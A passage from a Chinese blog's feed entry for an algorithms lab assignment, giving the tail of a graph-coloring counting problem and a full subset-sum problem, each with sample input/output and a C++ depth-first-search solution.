class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5 8 4 </span><br><span class="line">1 2</span><br><span class="line">1 3 </span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">2 5</span><br><span class="line">3 4</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e3</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,m,ans;</span><br><span class="line"><span class="keyword">int</span> map_c[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> color[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(d == n+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)     <span class="comment">//颜色m种</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)     <span class="comment">//n个点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(map_c[d][j] &amp;&amp; color[j] == i)  <span class="comment">//连通且颜色为i则失败</span></span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            color[d] = i;   <span class="comment">//染色</span></span><br><span class="line">            dfs(d+<span class="number">1</span>);       <span class="comment">//下一结点</span></span><br><span class="line">            color[d] = <span class="number">0</span>;   <span class="comment">//回到未染色状态</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1,tmp2;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;tmp1&gt;&gt;tmp2;</span><br><span class="line">        map_c[tmp1][tmp2] = <span class="number">1</span>;</span><br><span class="line">        map_c[tmp2][tmp1] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-部分和问题"><a href="#问题-E-部分和问题" class="headerlink" title="问题 E: 部分和问题"></a>问题 E: 部分和问题</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p><p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p><p><em>1*</em>≤<strong>N</strong>≤*<em>20</em>，输入整数及k均小于<em>1e8</em>。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 2 4 7</span><br><span class="line">13</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[maxn],k;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sum == k) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(l == n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(l+<span class="number">1</span>,sum)||dfs(l+<span class="number">1</span>,sum+a[l]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        <span class="keyword">if</span>(dfs(<span class="number">0</span>,<span class="number">0</span>)) </span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"Yes"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"No"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;算法实验四。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://1187100546.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://1187100546.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
